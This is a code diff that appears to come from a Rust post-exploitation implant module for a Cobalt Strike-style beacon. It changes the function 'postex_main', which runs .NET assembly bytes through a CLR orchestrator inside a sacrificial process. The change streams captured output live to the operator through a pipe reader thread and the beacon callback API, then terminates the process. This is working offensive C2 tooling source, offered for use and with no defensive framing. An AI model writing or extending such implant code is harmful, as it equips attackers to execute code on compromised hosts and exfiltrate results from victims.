@@ -70,8 +70,46 @@ pub unsafe extern "system" fn postex_main(data: *mut u8, len: i32) {
             asm_bytes: &parsed.asm_bytes,
         };
 
-        // 5. Run orchestrator. Streaming wiring done in Task 4.5.
-        match clr_orchestrator::orchestrate(&input, &engine) {
+        // 5. Run orchestrator in streaming mode. The hook captures the
+        //    pipe read handle and spawns a reader thread that forwards
+        //    output to operator live, instead of waiting for end-of-run
+        //    drain.
+        //
+        //    STREAMER_THREAD is an AtomicPtr<c_void> so the thunk and the
+        //    join site below can share state without static_mut_refs
+        //    triggering. postex_main runs at most once per process, so
+        //    the load/store sequencing is implicit.
+        use core::sync::atomic::{AtomicPtr, Ordering};
+        static STREAMER_THREAD: AtomicPtr<core::ffi::c_void> =
+            AtomicPtr::new(core::ptr::null_mut());
+
+        unsafe extern "C" fn pipe_ready_thunk(
+            read_handle: windows_sys::Win32::Foundation::HANDLE,
+            ctx: *mut core::ffi::c_void,
+        ) {
+            unsafe {
+                let api: &beacon_api::Api = &*(ctx as *const beacon_api::Api);
+                let h = streamer::spawn(read_handle, api);
+                STREAMER_THREAD.store(h.cast(), Ordering::Relaxed);
+            }
+        }
+
+        let api_ctx: *mut core::ffi::c_void =
+            &api as *const beacon_api::Api as *mut core::ffi::c_void;
+        let result = clr_orchestrator::orchestrate_streaming(
+            &input,
+            &engine,
+            pipe_ready_thunk,
+            api_ctx,
+        );
+
+        // 6. Wait for the reader to flush every buffered byte before we
+        //    terminate — otherwise final chunks may be lost.
+        let thread_handle: windows_sys::Win32::Foundation::HANDLE =
+            STREAMER_THREAD.load(Ordering::Relaxed).cast();
+        streamer::join(thread_handle);
+
+        match result {
             Ok(()) => api.output(beacon_api::CALLBACK_OUTPUT, b"[runner] done\n"),
             Err(e) => {
                 let msg = e.format();
@@ -80,7 +118,7 @@ pub unsafe extern "system" fn postex_main(data: *mut u8, len: i32) {
             }
         }
 
-        // 6. Exit sacrificial.
+        // 7. Exit sacrificial.
         cleanup::terminate_self();
     }
 }
